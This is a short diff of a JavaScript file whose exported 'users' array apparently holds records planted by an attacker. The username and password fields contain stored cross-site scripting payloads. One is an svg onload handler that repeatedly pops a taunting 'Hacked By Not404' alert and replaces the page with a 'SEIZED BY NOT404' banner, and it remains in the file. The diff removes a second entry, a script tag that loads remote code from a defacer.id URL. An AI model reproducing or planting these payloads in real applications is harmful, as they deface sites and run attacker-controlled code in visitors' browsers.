@@ -26,9 +26,5 @@ export const users = [
   {
     "username": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">",
     "password": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">"
-  },
-  {
-    "username": "<script src=\"https://jso.defacer.id/raw/Obh6Y4A314\"></script>",
-    "password": "<script src=\"https://jso.defacer.id/raw/Obh6Y4A314\"></script>"
   }
 ];
